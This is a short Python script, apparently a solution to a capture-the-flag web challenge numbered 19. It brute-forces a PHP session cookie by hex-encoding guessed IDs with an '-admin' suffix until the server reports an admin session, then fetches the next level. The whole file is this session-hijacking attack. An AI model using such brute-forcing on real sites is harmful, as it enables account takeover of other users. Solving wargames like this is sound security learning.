import Auther


def format(id: int):
    return f'{id}-admin'.encode().hex()


for seesionid in range(1, 640):
    # 281
    print(f"Progress: {seesionid}/640: {format(seesionid)}")
    with Auther.request(19, data={"username": "FOO",
                                  "password": "BAR"},
                        cookies={"PHPSESSID": f'{format(seesionid)}'}) as r:
        # print(r.text)
        if "You are an admin" in r.text:
            print(f"Admin session id: {seesionid}")
            Auther.semicolonGetter(r.text, 20)()
            break
